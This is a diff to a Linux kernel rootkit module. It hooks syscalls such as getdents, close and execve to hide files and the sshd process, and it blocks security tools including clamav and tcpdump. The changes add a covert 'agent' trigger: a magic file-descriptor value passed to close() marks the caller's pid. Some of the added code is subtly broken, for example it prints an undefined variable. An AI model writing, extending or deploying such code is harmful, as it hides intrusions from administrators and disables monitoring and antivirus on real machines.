@@ -14,6 +14,7 @@
 #include <linux/file.h>
 #include <linux/fdtable.h>
 #include <linux/proc_ns.h>
+#include <linux/sched.h>
 
 struct linux_dirent {
     unsigned long   d_ino;
@@ -22,9 +23,13 @@ struct linux_dirent {
     char            d_name[1];
 };
 
+int agentpid = NULL;
+
+int agentKey = 66432;
+
 const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};
 
-const char * const FILES_TO_HIDE[] = {"DragonKing.ko"};
+const char * const FILES_TO_HIDE[] = {"hidethis"};
 
 const char * const HIDDEN_PROCESSES[] = {"sshd"};
 
@@ -224,11 +229,11 @@ asmlinkage long (*orig_lstat)(const char __user *pathname, struct stat __user *b
 
 asmlinkage long (*orig_fstat)(unsigned int fd, struct __old_kernel_stat __user *statbuf);
 
-asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mode);
-
 asmlinkage long (*orig_stat)(const char __user *pathname, const struct stat __user *buf);
 
 asmlinkage long (*orig_access)(const char __user *pathname, const int __user mode);
+
+asmlinkage long (*orig_close)(unsigned int fd);
 
 //Why not use readdir? 
 //strace tells us getdents is the function ls eventually triggers ;)
@@ -252,20 +257,17 @@ asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsi
 }
 
 
-
-asmlinkage int hacked_open(const char __user *filename, int flag, umode_t mode){
+asmlinkage long hacked_close(unsigned int fd){
 	int ret = NULL;
-
-	if(isHidden(filename)){
-		ret = -ENOENT;
-		return ret;
-	}	
-
-	ret = (*orig_open)(filename, flag, mode);	
+	if(fd == agentKey){
+		agentpid = task_pid_nr(current);
+		printk("Agent trigger detected\n");
+		printk("Agent process pid is %d\n", pid);
+	}
+	ret = (*orig_close)(fd);
 	return ret;
-
-
 }
+
 			       
 
 
@@ -328,6 +330,17 @@ asmlinkage long hacked_execve(const char __user *filename, char const __user *ar
         kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
         copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));
 
+	//if(strcmp(kern_buff, "ls") == 0){
+	//	printk("ls executed with %d. Printing environment variables.\n", sizeof(envp)/sizeof(char *));
+	//	printk("2nd environment variable is %s\n", envp[1]);
+	//	globa = sizeof(envp)/sizeof(envp[0]);
+	//	printk("globa: %d\n", globa);
+		//int a;
+		//for(a = 0; a < sizeof(envp)/sizeof(envp[0]); a++){
+		//	printk("Environment variable: %s\n", envp[a]);
+		//}
+	//}
+		
 	printk("FILENAME: %s\n", kern_buff);
         for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){
 
